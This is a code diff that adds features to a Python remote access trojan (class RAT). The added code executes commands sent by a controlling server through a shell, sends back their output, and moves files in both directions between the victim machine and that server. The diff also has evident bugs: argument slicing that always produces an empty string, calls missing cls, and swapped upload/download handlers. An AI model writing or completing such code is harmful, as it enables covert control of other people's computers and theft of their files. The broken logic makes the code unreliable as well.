@@ -125,8 +125,7 @@ class RAT:
 	LONG_INTERAL = 10
 
 	SIG = "ACTIVE"
-	PASS = "DONE"
-	FAIL = "FILE_NONE"
+	ACK_SIG = "0x06"
 	FLAG = False
 
 
@@ -178,7 +177,38 @@ class RAT:
 
 
 
-	
+	# download content from server
+	def download(cls, fn):
+		g = open(fn, 'wb')
+		# download file
+		fd = cls.receive()
+		time.sleep(cls.MID_INTERVAL)
+		g.write(fd)
+		g.close()
+		# let server know we're done..
+		return cls.ACK_SIG
+
+
+	# upload content to server
+	def upload(cls, fn):
+		filename = unicode(fn, "utf8")
+		#bgtr = True
+		# file transfer
+		try:
+			f = open(filename, 'rb')
+			while 1:
+				fd = f.read()
+				if(fd == ''): break
+				# begin sending file
+				cls.send(fd)
+			f.close()
+		except:
+			time.sleep(cls.SHORT_INTERVAL)
+		# let server know we're done..
+		time.sleep(cls.MID_INTERVAL)
+		cls.send("")
+		time.sleep(cls.MID_INTERVAL)
+		return cls.ACK_SIG
 
 
 	# start the service
@@ -193,7 +223,30 @@ class RAT:
 					cls.FLAG = True
 					cls.send("\n" + os.getcwd() + "> ")
 
-				if()
+				# check for quit
+				if(data == 'quit' or data == 'terminate'):
+					cls.send('Quitted...')
+					break;
+				# check for change directory
+				elif(data.startswith('cd ')):
+					os.chdir(data[len(data):])
+					stdoutput = ""
+				# check for download
+				elif(data.startswith('download ')):
+					stdoutput = upload(data[len(data):])
+				# check for upload
+				elif(data.startswith('upload ')):
+					stdoutput = download(data[len(data):])
+				
+
+				else:
+					proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+					stdoutput = proc.stdout.read() + proc.stderr.read()
+
+				# Send data to server
+				stdoutput += "\n" + os.getcwd() + "> "
+				stdoutput = stdoutput.decode('gbk').encode('utf-8')
+				cls.send(stdoutput)
 
 			except socket.error as e:
 				# Connection refused
